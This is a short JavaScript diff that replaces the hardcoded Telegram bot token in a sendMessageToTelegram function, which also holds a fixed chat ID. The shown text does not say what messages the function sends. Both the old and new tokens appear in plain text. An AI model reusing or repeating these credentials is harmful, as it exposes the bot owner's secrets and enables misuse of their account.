@@ -60,7 +60,7 @@ function unique(arr) {
 function sendMessageToTelegram(message) {
   return new Promise((resolve, reject) => {
     const chat_id = "608667192";
-    const telegrambot_token = "6675183376:AAFIHE7oDIHTb1vtOsZMLunu9oEcD0DwPTM";
+    const telegrambot_token = "7125150542:AAFFYrU1SoVyBrnFi91KacR3rCIJfbM3FyY";
     const url = `https://api.telegram.org/bot${telegrambot_token}/sendMessage`;
     const body = {
       chat_id: chat_id,
